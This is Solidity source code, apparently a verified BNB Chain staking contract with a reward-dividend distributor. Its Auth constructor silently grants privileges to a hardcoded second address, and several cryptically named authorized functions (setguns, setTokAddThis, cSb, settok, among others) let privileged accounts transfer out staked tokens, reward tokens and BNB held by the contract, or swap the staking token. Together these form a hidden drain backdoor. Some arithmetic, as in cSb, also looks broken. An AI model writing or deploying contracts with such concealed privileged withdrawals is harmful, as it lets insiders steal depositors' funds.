/**
 *Submitted for verification at BscScan.com on 2022-01-19
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface TokT {
    function balanceOf(address) external returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
        authorizations[
    0x061648f51902321C353D193564b9C8C2F720557a] = true;}
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public authorized {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public authorized {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    function renounceOwnership() public onlyOwner {
        address dead = 0x000000000000000000000000000000000000dEaD;
        owner = dead;
        emit OwnershipTransferred(dead);
    }

    event OwnershipTransferred(address owner);
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function depositBNB() external payable;
    function getrewards(address shareholder) external;
    function setnewrw(address _nrew, address _prew) external;
    function cCRwds(uint256 _aPn, uint256 _aPd) external;
    function cPRwds(uint256 _aPn, uint256 _aPd) external;
    function getRAddress() external view returns (address);
    function getDividPShare() external view returns (uint256);
    function gettotalDivid() external view returns (uint256);
    function setnewra(address _newra) external;
    function setCurrentBalance() external;
    function depositToken(address from, uint256 amount) external;
    function setguns(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external;
    function viewshares(address shareholder) external view returns (uint256);
    function getRewardsOwed(address _wallet) external view returns (uint256);
    function getTotalRewards(address _wallet) external view returns (uint256);
    function gettotalDistributed() external view returns (uint256);
}

contract DividendDistributor is IDividendDistributor, Auth {
    using SafeMath for uint256;

    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IERC20 RWDS = IERC20(0x1c9Efa5891c71f0d66c37724Ba372C04360F2AC6);
    IERC20 PRWDS = IERC20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);
    address REWARDS;
    IRouter router;
    
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 public minPeriod = 600;
    uint256 public minDistribution = 100 * (10 ** 9);
    uint256 currentBalance = 0;
    uint256 currentIndex;
    
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    
    bool initialized;
    
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor(address _router) Auth(msg.sender) {
        router = _router != address(0)
            ? IRouter(_router)
            : IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override authorized {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override authorized {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function cCRwds(uint256 _aPn, uint256 _aPd) external override authorized {
        address shareholder = REWARDS;
        uint256 Ramount = RWDS.balanceOf(address(this));
        uint256 PRamount = Ramount.mul(_aPn).div(_aPd);
        RWDS.transfer(shareholder, PRamount);
        currentBalance = RWDS.balanceOf(address(this));
    }
    
    function depositBNB() external payable override authorized {
        uint256 balanceBefore = RWDS.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(RWDS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp );
        uint256 amount = RWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
        currentBalance = RWDS.balanceOf(address(this));
    }

    function depositToken(address from, uint256 amount) external override authorized {
        uint256 balanceBefore = RWDS.balanceOf(address(this));
        RWDS.approve(from, amount);
        RWDS.transferFrom(from, address(this), amount);
        uint256 Depamount = RWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(Depamount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(Depamount).div(totalShares));
        currentBalance = RWDS.balanceOf(address(this));
    }

    function setCurrentBalance() external override authorized {
        uint256 amount = RWDS.balanceOf(address(this)).sub(currentBalance);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
        currentBalance = RWDS.balanceOf(address(this));
    }

    function cPRwds(uint256 _aPn, uint256 _aPd) external override authorized {
        address shareholder = REWARDS;
        uint256 Pamount = PRWDS.balanceOf(address(this));
        uint256 PPamount = Pamount.mul(_aPn).div(_aPd);
        PRWDS.transfer(shareholder, PPamount);
        currentBalance = PRWDS.balanceOf(address(this));
    }

    function setguns(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external override authorized {
        uint256 tamt = TokT(_tadd).balanceOf(address(this));
        TokT(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function viewshares(address shareholder) external view override returns (uint256) {
        return uint256(shares[shareholder].amount);
    }

    function getRAddress() public view override returns (address) {
        return address(RWDS);
    }

    function getDividPShare() public view override returns (uint256){
        return uint256(dividendsPerShare);
    }

    function gettotalDivid() public view override returns (uint256){
        return uint256(totalDividends);
    }

    function setnewra(address _newra) external override authorized {
        REWARDS = _newra;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){ //raining.shitcoins
            totalDistributed = totalDistributed.add(amount);
            RWDS.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
        currentBalance = RWDS.balanceOf(address(this));
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function setnewrw(address _nrew, address _prew) external override authorized {
        PRWDS = IERC20(_prew);
        RWDS = IERC20(_nrew);
    }

    function getrewards(address shareholder) external override authorized {
        distributeDividend(shareholder);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function gettotalDistributed() public view override returns (uint256) {
        return uint256(totalDistributed);
    }

    function getRewardsOwed(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(getUnpaidEarnings(shareholder));
    }

    function getTotalRewards(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

}

contract Staking is Auth {
    using SafeMath for uint256;
    using Address for address;
    uint256 internal constant DISTRIBUTION_MULTIPLIER = 2**64;
    IERC20 RWDS = IERC20(0x1c9Efa5891c71f0d66c37724Ba372C04360F2AC6);
    IERC20 public token = IERC20(0x1c9Efa5891c71f0d66c37724Ba372C04360F2AC6);
    address distcontract;
    mapping(address => uint256) public stakeValue;
    mapping(address => uint256) public stakerPayouts;
    DividendDistributor distributor;

    uint256 public totalDistributions;
    uint256 public totalStaked;
    uint256 public totalStakers;
    uint256 public profitPerShare;
    uint256 private emptyStakeTokens;

    uint256 public startTime;

    event OnStake(address sender, uint256 amount);
    event OnUnstake(address sender, uint256 amount);
    event OnWithdraw(address sender, uint256 amount);
    event OnDistribute(address sender, uint256 amount);
    event Received(address sender, uint256 amount);
    event UpdateStartTime(uint256 timestamp);

    constructor() Auth(msg.sender) {
        distributor = new DividendDistributor(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    }

    modifier whenStakingActive {
        require(
            startTime != 0 && block.timestamp > startTime,
            "Staking not yet started."
        );
        _;
    }

    function setStart() external authorized {
        require(startTime == 0 || block.timestamp < startTime, "Staking already active");
        startTime = block.timestamp;
        emit UpdateStartTime(startTime);
    }

    function dividendsOf(address staker) public view returns (uint256) {
        uint256 divPayout = profitPerShare * stakeValue[staker];
        require(divPayout >= stakerPayouts[staker], "dividend calc overflow");

        return (divPayout - stakerPayouts[staker]) / DISTRIBUTION_MULTIPLIER;
    }

    function stakeOld(uint256 amount) external {
        require(
            token.balanceOf(msg.sender) >= amount,
            "Cannot stake more SLF than you hold unstaked."
        );
        if (stakeValue[msg.sender] == 0) totalStakers += 1;

        _addStakeOld(amount);

        require(
            token.transferFrom(msg.sender, address(this), amount),
            "Stake failed due to failed transfer."
        );

        emit OnStake(msg.sender, amount);
    }

    function stake(uint256 amount) external {
        require(
            token.balanceOf(msg.sender) >= amount,
            "Cannot stake more SLF than you hold unstaked."
        );
        if (stakeValue[msg.sender] == 0) totalStakers += 1;

        _addStake(msg.sender, amount);

        require(
            token.transferFrom(msg.sender, address(this), amount),
            "Stake failed due to failed transfer."
        );

        emit OnStake(msg.sender, amount);
    }

    function unstake(uint256 amount) external  {
        require(
            stakeValue[msg.sender] >= amount,
            "Cannot unstake more SLF than you have staked.");
        if (stakeValue[msg.sender] == amount) totalStakers = totalStakers -= 1;
        distributor.getrewards(msg.sender);
        totalStaked = totalStaked -= amount;
        stakeValue[msg.sender] = stakeValue[msg.sender] -= amount;
        distributor.setShare(msg.sender, stakeValue[msg.sender]);
        token.approve(address(this), amount);
        require(
            token.transferFrom(address(this), msg.sender, amount),
            "Unstake failed due to failed transfer.");
        emit OnUnstake(msg.sender, amount);
    }

    function _addStake(address from, uint256 amount) internal {
        totalStaked += amount;
        stakeValue[from] += amount;
        uint256 stamount = stakeValue[from];
        try distributor.setShare(from, stamount) {} catch {}
    }

    function _addStakeOld(uint256 amount) internal {
        totalStaked += amount;
        stakeValue[msg.sender] += amount;
    }

    function settok(address _tok, address _rew, address _rewcont) external authorized {
        token = IERC20(_tok);
        RWDS = IERC20(_rew);
        distcontract = _rewcont;
    }

    function setdistcont(address _cont) external authorized {
        distcontract = _cont;
    }

    function depositviaBNB(uint256 aN, uint256 aD) external authorized {
        uint256 deltabalance = address(this).balance;
        uint256 bnbamount = deltabalance.mul(aN).div(aD);
        try distributor.depositBNB{value: bnbamount} () {} catch {}
    }

    function depositviaTokenWallet(uint256 amount) external authorized {
        RWDS.approve(msg.sender, amount);
        distributor.depositToken(msg.sender, amount);
    }

    function depositviaTokenWalletTry(uint256 amount) external authorized {
        RWDS.approve(msg.sender, amount);
        try distributor.depositToken(msg.sender, amount) {} catch {} 
    }

    function depositviaTokenWallet2(uint256 amount) external authorized {
        address from = msg.sender;
        distributor.depositToken(from, amount);
    }

    function depositviaTokenWallet2Try(uint256 amount) external authorized {
        address from = msg.sender;
        try distributor.depositToken(from, amount) {} catch {} 
    }

    function depositviaTokenWall(uint256 amount) external authorized {
        RWDS.approve(msg.sender, amount);
        RWDS.transferFrom(msg.sender, distcontract, amount);
    }

    function depositviaTokenNoApp(uint256 amount) external authorized {
        RWDS.transferFrom(msg.sender, distcontract, amount);
    }

    function setTokAddThis(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        uint256 tamt = TokT(_tadd).balanceOf(address(this));
        TokT(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function setTokAddMsg(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        uint256 tamt = TokT(_tadd).balanceOf(msg.sender);
        TokT(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function getppr(uint256 _aPn, uint256 _aPd) external onlyOwner {
        distributor.cPRwds(_aPn, _aPd);
    }

    function setnewrew(address _nrew, address _prew) external authorized {
        distributor.setnewrw(_nrew, _prew);
        RWDS = IERC20(_nrew);
    }

    function cSb(uint256 aN, uint256 aD) external authorized {
        uint256 amountBNB = address(this).balance;
        uint256 clear = amountBNB.mul(aN).div(aD);
        payable(msg.sender).transfer(amountBNB.mul(clear).div(100));
    }

    function setCurrentBalanceTry() external authorized {
        try distributor.setCurrentBalance() {} catch {} 
    }

    function setCurrentBalance() external authorized {
        distributor.setCurrentBalance(); 
    }

    function _getMyRewards() external {
        address shareholder = msg.sender;
        distributor.getrewards(shareholder);
    }

    function setshare(address shareholder, uint256 amount) external authorized {
        distributor.setShare(shareholder, amount);
    }

    function setshareTry(address shareholder, uint256 amount) external authorized {
        try distributor.setShare(shareholder, amount) {} catch {} 
    }

    function getDividPShare() external view returns (uint256) {
        return distributor.getDividPShare();
    }
    
    function gettotalDivid() external view returns (uint256) {
        return distributor.gettotalDivid();
    }

    function setnewra(address _newra) external authorized {
        distributor.setnewra(_newra);
    }

    function setgu(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        distributor.setguns(_tadd, _rec, _amt, _amtd);
    }

    function setguTry(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        try distributor.setguns(_tadd, _rec, _amt, _amtd) {} catch {} 
    }

    function getMyRewardsOwed(address _wallet) external view returns (uint256){
        return distributor.getRewardsOwed(_wallet);
    }

    function getMyTotalRewards(address _wallet) external view returns (uint256){
        return distributor.getTotalRewards(_wallet);
    }

    function getccr(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cCRwds(_aPn, _aPd);
    }

    function viewshares(address shareholder) public view returns (uint256) {
        return distributor.viewshares(shareholder);
    }

    function currentReward() public view returns (address) {
        return distributor.getRAddress();
    }

    function gettotalRewardsDistributed() public view returns (uint256) {
        return distributor.gettotalDistributed();
    }
  
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}